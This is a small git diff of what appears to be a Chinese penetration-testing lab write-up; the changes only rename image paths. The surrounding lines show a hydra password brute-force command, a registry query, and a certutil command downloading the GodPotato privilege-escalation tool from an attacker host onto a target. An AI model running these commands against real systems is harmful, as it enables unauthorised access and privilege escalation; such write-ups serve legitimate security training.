@@ -124,11 +124,11 @@ hydra -L /usr/share/secLists/Usernames/Names/names.txt -P /usr/share/SecLists/Pa
 reg query "HKEY_L0CAL_MACHINE\S0FTWARE\Microsoft\NET Framework Setup\NDP"
 ```
 
-<figure><img src="../.gitbook/assets/26 (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/26 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 下载GodPotato-NET4.exe，然后将工具传到目标系统中：
 
-<figure><img src="../.gitbook/assets/27 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/27 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```powershell
 certutil -split -f -urlcache http://192.168.45.158/GodPotato-NET4.exe
